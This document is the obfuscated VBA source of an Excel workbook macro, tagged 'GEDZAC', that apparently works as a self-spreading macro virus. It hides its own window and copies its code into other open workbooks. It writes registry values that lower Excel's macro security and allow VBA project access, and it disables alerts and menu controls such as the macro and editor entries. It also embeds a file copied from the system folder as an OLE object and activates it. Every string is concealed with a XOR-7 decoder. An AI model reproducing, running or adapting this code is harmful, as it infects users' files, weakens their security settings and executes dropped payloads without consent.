'GEDZAC
Dim f As Object, w As Object, bkey2 As String
Private Sub Workbook_Open()
On Error Resume Next: Windows(Me.Name).Visible = x("Surb")
End Sub
Private Sub Workbook_Deactivate()
On Error Resume Next: Dim ISM As String, Xv(4) As String, VPath As String
Set w = CreateObject(x("PTdunws)Tobkk")): Set f = CreateObject(x("Tdunwsni`)AnkbT~tsbjHembds")): Call IsBKey
Set Axl = ActiveWorkbook.VBProject.VBComponents.Item(1): Set Mx = Me.VBProject.VBComponents.Item(1)
If LCase(Axl.CodeModule.Lines(1, 1)) <> x(" `bc}fd") Then
Xv(0) = x("[_ktJhcrkb)bb"): Xv(1) = x("[Chdrjbis)wna"): Xv(2) = x("[BdbkObkw)wna"): Xv(3) = x("[UriHaandb)tdu"): Xv(4) = x("[BdbkAnkb)bb")
Randomize: n = Int(Rnd * 5): VPath = f.GetSpecialFolder(2) & Xv(n)
If Dir(VPath) = "" Then FileCopy f.GetSpecialFolder(1) & x("[") & bkey2, VPath
If Axl.CodeModule.CountOfLines > 0 Then Axl.CodeModule.DeleteLines 1, Axl.CodeModule.CountOfLines
ISM = Mx.CodeModule.Lines(2, 1) & vbCrLf & Mx.CodeModule.Lines(22, Mx.CodeModule.CountOfLines)
Axl.CodeModule.InsertLines 1, x(" @BC]FD") & vbCrLf & ISM
Application.Worksheets(1).Shapes.AddOLEObject Left:=100, Top:=100, Width:=200, Height:=300, FileName:=VPath, link:=False
If ActiveWorkbook.Path <> "" Then ActiveWorkbook.Save
End If
Windows(Me.Name).Visible = x("Afktb")
End Sub
Private Sub Workbook_Activate()
On Error Resume Next
Set w = CreateObject(x("PTdunws)Tobkk")): Set f = CreateObject(x("Tdunwsni`)AnkbT~tsbjHembds")): Call IsBKey
Application.ScreenUpdating = x("Afktb"): Application.DisplayStatusBar = x("Afktb")
Application.DisplayAlerts = x("Afktb"): Application.EnableCancelKey = 0
Application.CommandBars(x("Pnichp")).Controls(4).Enabled = x("Afktb")
Application.CommandBars(x("Qnbp")).Controls(3).Enabled = x("Afktb")
Application.CommandBars(x("Qntrfk'Eftnd")).Enabled = x("Afktb")
Application.CommandBars(x("Shhkt")).Controls(x("Jfduh")).Enabled = x("Afktb")
Application.CommandBars(x("Shhkt")).Controls(12).Enabled = x("Afktb")
Application.CommandBars(x("Shhkt")).Controls(13).Enabled = x("Afktb")
If Int(Application.Version) > 8 Then
w.Regwrite x("OLB^XDRUUBISXRTBU[Thaspfub[Jnduhthas[Haandb[67)7[Bdbk[Tbdruns~[Kbqbk"), 1, "REG_DWORD"
w.Regwrite x("OLB^XDRUUBISXRTBU[Thaspfub[Jnduhthas[Haandb[67)7[Bdbk[Tbdruns~[FddbttQEHJ"), 1, "REG_DWORD"
w.Regwrite x("OLB^XRTBUT[)CBAFRKS[Thaspfub[Jnduhthas[Haandb[67)7[Bdbk[Tbdruns~[Kbqbk"), 1, "REG_DWORD"
w.Regwrite x("OLB^XDRUUBISXRTBU[Thaspfub[Jnduhthas[Haandb[>)7[Bdbk[Tbdruns~[Kbqbk"), 1, "REG_DWORD"
w.Regwrite x("OLB^XRTBUT[)CBAFRKS[Thaspfub[Jnduhthas[Haandb[>)7[Bdbk[Tbdruns~[Kbqbk"), 1, "REG_DWORD"
Application.CommandBars(x("Shhkt")).Controls(14).Enabled = x("Afktb")
ElseIf Int(Application.Version) < 9 Then
w.Regwrite x("OLB^XDRUUBISXRTBU[Thaspfub[Jnduhthas[Haandb[?)7[Bdbk[Jnduhthas'Bdbk[Hwsnhit1"), 0, "REG_DWORD"
Application.CommandBars(x("Shhkt")).Controls(11).Enabled = x("Afktb")
End If
If Dir(f.GetSpecialFolder(1) & x("[") & bkey2) = "" Then
Application.Worksheets(1).Visible = True: Application.Worksheets(1).Shapes(1).OLEFormat.Activate
Else
Application.Worksheets(1).Visible = False
End If
End Sub
Private Function x(c)
On Error Resume Next
For i = 1 To Len(c)
x = x & Chr(Asc(Mid(c, i, 1)) Xor 7)
Next
End Function
Private Function IsBKey()
On Error Resume Next
bkey2 = x(w.RegRead(x("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[ELb~5")))
If f.FileExists(f.GetSpecialFolder(1) & "\" & bkey2) Then IsBKey = True Else IsBKey = False
End Function